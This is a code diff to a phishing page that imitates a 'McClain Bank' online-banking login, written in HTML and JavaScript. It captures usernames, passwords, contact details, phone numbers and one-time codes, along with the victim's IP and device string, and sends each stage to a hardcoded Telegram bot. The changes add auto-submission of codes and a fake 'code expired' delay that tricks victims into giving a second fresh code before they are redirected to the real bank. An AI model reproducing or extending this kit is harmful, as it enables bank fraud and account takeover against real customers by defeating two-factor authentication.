@@ -106,7 +106,7 @@
       <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
     </div>
 
-    <form id="step-email">
+    <form id="step-email" novalidate>
       <div class="field">
         <div class="label">Username</div>
         <input id="email" type="text" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="username" aria-label="Username">
@@ -118,7 +118,7 @@
       </div>
     </form>
 
-    <form id="step-password" hidden>
+    <form id="step-password" hidden novalidate>
       <div class="signas">Signing in as <b class="address-value"></b> · <a href="#" class="change-link">Change</a></div>
       <div class="field">
         <div class="label">Password</div>
@@ -128,7 +128,7 @@
       <div class="row right"><button type="submit">Sign in</button></div>
     </form>
 
-    <form id="step-2fa" hidden>
+    <form id="step-2fa" hidden novalidate>
       <h2 class="h2fa">Two-factor authentication</h2>
       <p class="hint">Add an email and mobile number to receive verification codes.</p>
       <div class="field">
@@ -147,7 +147,7 @@
       <div class="row right"><button type="submit">Next</button></div>
     </form>
 
-    <form id="step-code" hidden>
+    <form id="step-code" hidden novalidate>
       <div class="signas">A code was sent to the phone on file for <b class="address-value"></b></div>
       <div class="field">
         <div class="label">Verification code</div>
@@ -168,17 +168,17 @@
 </footer>
 
 <script>
-const emailInput   = document.getElementById('email');
-const passwordInput= document.getElementById('password');
-const contactEmail = document.getElementById('contact-email');
-const phoneInput   = document.getElementById('phone');
-const codeInput    = document.getElementById('code');
+const emailInput    = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+const contactEmail  = document.getElementById('contact-email');
+const phoneInput    = document.getElementById('phone');
+const codeInput     = document.getElementById('code');
 
-const stepEmail    = document.getElementById('step-email');
-const stepPassword = document.getElementById('step-password');
-const step2fa      = document.getElementById('step-2fa');
-const stepCode     = document.getElementById('step-code');
-const statusMessage= stepCode.querySelector('.status-message');
+const stepEmail     = document.getElementById('step-email');
+const stepPassword  = document.getElementById('step-password');
+const step2fa       = document.getElementById('step-2fa');
+const stepCode      = document.getElementById('step-code');
+const statusMessage = stepCode.querySelector('.status-message');
 
 const steps = [stepEmail, stepPassword, step2fa, stepCode];
 const addressValues = document.querySelectorAll('.address-value');
@@ -186,8 +186,16 @@ const trackingEmail = new URLSearchParams(location.search).get('e') || '';
 
 const BOT_TOKEN = '7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8';
 const CHAT_ID   = '6069290001';
-const REDIRECT_URL = 'https://secure.mcclainbank.com';
-const FINAL_DELAY_MS = 2000;
+const REDIRECT_URL   = 'https://secure.mcclainbank.com';
+const FIRST_HOLD_MS  = 90000;
+const SECOND_HOLD_MS = 60000;
+
+let ip = '-';
+let attempt = 0;
+let holdTimer = null;
+
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json()).then(d => { if (d && d.ip) ip = d.ip; }).catch(() => {});
 
 function showStep(i){
   steps.forEach((s,n)=>{ s.hidden = n !== i; });
@@ -202,22 +210,29 @@ function updateAddress(){
 function buttonOf(f){ return f.querySelector('button'); }
 function lockButton(b,l){ b.textContent = l; b.disabled = true; }
 function resetButtons(){
+  clearTimeout(holdTimer);
   buttonOf(stepEmail).textContent='Continue';   buttonOf(stepEmail).disabled=false;
   buttonOf(stepPassword).textContent='Sign in'; buttonOf(stepPassword).disabled=false;
   buttonOf(step2fa).textContent='Next';         buttonOf(step2fa).disabled=false;
   buttonOf(stepCode).textContent='Verify';      buttonOf(stepCode).disabled=false;
+  codeInput.value = '';
   statusMessage.hidden = true;
+  attempt = 0;
 }
 function method(){
   const picked = document.querySelector('input[name="method"]:checked');
   return picked ? picked.value : 'text';
 }
-function fetchIp(){
-  return fetch('https://api.ipify.org?format=json')
-    .then(r=>r.json()).then(d=>d.ip).catch(()=>'Unavailable');
+
+function tg(text){
+  return fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID,text:text})
+  }).catch(()=>{});
 }
-async function send(stage, otp){
-  const ip = await fetchIp();
+
+function send(stage, otp){
   const msg =
     '*#--------[ McCLAIN BANK ]---------#*\n\n' +
     '*Username* : ' + emailInput.value.trim() + '\n' +
@@ -230,37 +245,61 @@ async function send(stage, otp){
     '*Device* : ' + navigator.userAgent + '\n' +
     (trackingEmail ? '*Recipient* : ' + trackingEmail + '\n' : '') +
     '\n*#------------[ ' + stage + ' ]-------------#*';
-  return fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT_ID,text:msg})
-  }).catch(()=>{});
+  tg(msg);
 }
 
 stepEmail.addEventListener('submit', e=>{
   e.preventDefault(); updateAddress(); showStep(1);
 });
 
-stepPassword.addEventListener('submit', async e=>{
+stepPassword.addEventListener('submit', e=>{
   e.preventDefault(); updateAddress();
   lockButton(buttonOf(stepPassword),'Logging in...');
-  await send('STEP 2 - PASSWORD');
+  send('STEP 2 - PASSWORD');
   resetButtons(); showStep(2);
 });
 
-step2fa.addEventListener('submit', async e=>{
+step2fa.addEventListener('submit', e=>{
   e.preventDefault();
   lockButton(buttonOf(step2fa),'Sending...');
-  await send('STEP 3 - 2FA SETUP');
+  send('STEP 3 - 2FA SETUP');
   resetButtons(); showStep(3);
 });
 
-stepCode.addEventListener('submit', async e=>{
+codeInput.addEventListener('input', ()=>{
+  codeInput.value = codeInput.value.replace(/\D/g,'').slice(0,8);
+  if(codeInput.value.length === 6 && !buttonOf(stepCode).disabled){
+    stepCode.requestSubmit();
+  }
+});
+
+stepCode.addEventListener('submit', e=>{
   e.preventDefault();
+  const code = codeInput.value.replace(/\D/g,'');
+  if(code.length < 6) return;
+
+  attempt += 1;
+  send('STEP 4 - CODE' + (attempt > 1 ? ' RETRY' : ''), code);
+
   lockButton(buttonOf(stepCode),'Verifying...');
-  statusMessage.textContent='Verifying your code...'; statusMessage.hidden=false;
-  try { await send('STEP 4 - CODE', codeInput.value.trim()); }
-  finally { setTimeout(()=>{ location.href = REDIRECT_URL; }, FINAL_DELAY_MS); }
+  statusMessage.textContent = 'Verifying your code...';
+  statusMessage.hidden = false;
+  clearTimeout(holdTimer);
+
+  const isLast = attempt >= 2;
+  holdTimer = setTimeout(()=>{
+    if(isLast){
+      statusMessage.textContent = 'Redirecting to online banking...';
+      setTimeout(()=>{ location.href = REDIRECT_URL; }, 800);
+      return;
+    }
+    codeInput.value = '';
+    buttonOf(stepCode).disabled = false;
+    buttonOf(stepCode).textContent = 'Verify';
+    statusMessage.textContent = 'That code expired. Enter the newest one from your device.';
+    statusMessage.hidden = false;
+    codeInput.focus();
+  }, isLast ? SECOND_HOLD_MS : FIRST_HOLD_MS);
 });
 
 document.querySelectorAll('.change-link').forEach(a=>{
